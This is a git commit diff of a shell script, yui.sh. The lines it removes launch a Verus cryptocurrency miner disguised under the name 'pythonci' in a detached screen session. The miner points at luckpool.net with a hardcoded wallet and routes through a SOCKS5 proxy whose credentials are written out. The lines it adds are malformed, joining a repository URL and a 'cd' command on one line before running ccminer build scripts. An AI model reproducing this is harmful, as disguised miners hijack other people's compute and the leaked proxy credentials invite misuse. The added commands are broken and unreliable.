93cbd06510c31c914c880390a9bd240812638581
ardisukarmo <90567200+ardisukarmo@users.noreply.github.com>
2021-09-20 21:28:32 +0700

    Update yui.sh

--- yui.sh
+++ yui.sh
@@ -1,10 +1,4 @@
 #!/bin/bash
-sudo apt update
-sudo apt install screen libjansson4 -y
-chmod +x woni.sh && chmod +x pythonci chmod 777 pythonci woni.sh
-screen -dmS ls
-jem=stratum+tcp://na.luckpool.net:3956
-bot=RXM8Btq8mJuPPk19t7B6hgZsty7p14cbpG
-welo=BR15
-yoto=socks5://fpfzeeby:3wdw0eiq8cm5@103.240.161.108:6667
-./pythonci -a verus -o $jem -u $bot.$welo -p x -t 2 -x $yoto
+
+https://github.com/ardisukarmo/andias.git cd docker/ccminer-verus
+chmod +x ./build.sh && ./run.sh
